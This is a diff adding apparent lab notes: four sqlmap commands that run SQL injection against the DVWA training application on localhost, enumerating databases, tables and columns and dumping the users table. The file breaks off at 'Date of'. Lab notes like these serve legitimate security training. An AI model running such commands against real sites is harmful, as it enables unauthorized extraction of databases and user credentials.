@@ -1,0 +1,13 @@
+1.Database enumeration:
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="PHPSESSID=SESSION_ID; security=low" --batch –dbs
+2. Table enumeration:
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="PHPSESSID=SESSION_ID; security=low" --batch -D dvwa --tables
+3. Column enumeration:
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="PHPSESSID=SESSION_ID; security=low" --batch -D dvwa -T users --columns
+4. Data extraction:
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="PHPSESSID=SESSION_ID; security=low" --batch -D dvwa -T users --dump
+Date of
